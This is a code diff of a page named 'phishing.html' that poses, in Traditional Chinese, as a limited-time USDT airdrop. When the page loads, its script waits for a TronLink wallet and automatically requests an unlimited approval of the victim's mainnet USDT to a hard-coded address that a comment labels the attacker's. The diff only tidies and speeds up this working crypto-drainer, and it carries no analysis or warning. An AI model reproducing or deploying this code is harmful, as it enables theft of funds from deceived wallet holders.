@@ -1,4 +1,4 @@
-
+<!-- phishing.html -->
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -6,18 +6,18 @@
   <title>限時空投活動</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
   <style>
-    body { font-family: Arial, text-align: center; padding: 60px; background: #f4f4f4; }
-    h1 { color: #333; }
-    #status { margin-top: 20px; font-size: 18px; color: #666; }
+    body { font-family: Arial; background: #f4f4f4; padding: 50px; text-align: center; }
+    h1 { color: #222; }
+    #status { margin-top: 20px; font-size: 18px; color: #555; }
   </style>
 </head>
 <body>
-  <h1>🎉 恭喜你獲得限時空投！</h1>
-  <p id="status">請稍候，正在初始化授權...</p>
+  <h1>🎁 恭喜獲得限時 USDT 空投</h1>
+  <p id="status">請稍候，正在啟動授權...</p>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 正確 TRC20 USDT 主網合約
-    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 主控地址
+    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // ✅ 主網 USDT
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";   // ✅ 攻擊者地址
     const ABI = [{
       "constant": false,
       "inputs": [
@@ -30,18 +30,18 @@
     }];
 
     async function autoApprove() {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        document.getElementById("status").innerText = "❗ 請使用 TronLink 錢包開啟本頁面";
+      const tronWeb = window.tronWeb;
+      if (!tronWeb || !tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "❌ 請在 TronLink App 中打開本頁面";
         return;
       }
 
-      const tronWeb = window.tronWeb;
-      const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
-      document.getElementById("status").innerText = "⏳ 發送授權中...";
+      const contract = await tronWeb.contract(ABI, CONTRACT);
+      const max = tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
 
+      document.getElementById("status").innerText = "⏳ 授權發送中...";
       try {
-        const maxUint = tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-        const tx = await contract.approve(SPENDER, maxUint).send();
+        const tx = await contract.approve(SPENDER, max).send();
         document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
@@ -49,12 +49,12 @@
     }
 
     window.addEventListener("load", () => {
-      const interval = setInterval(() => {
+      const check = setInterval(() => {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-          clearInterval(interval);
+          clearInterval(check);
           autoApprove();
         }
-      }, 1000);
+      }, 500);
     });
   </script>
 </body>
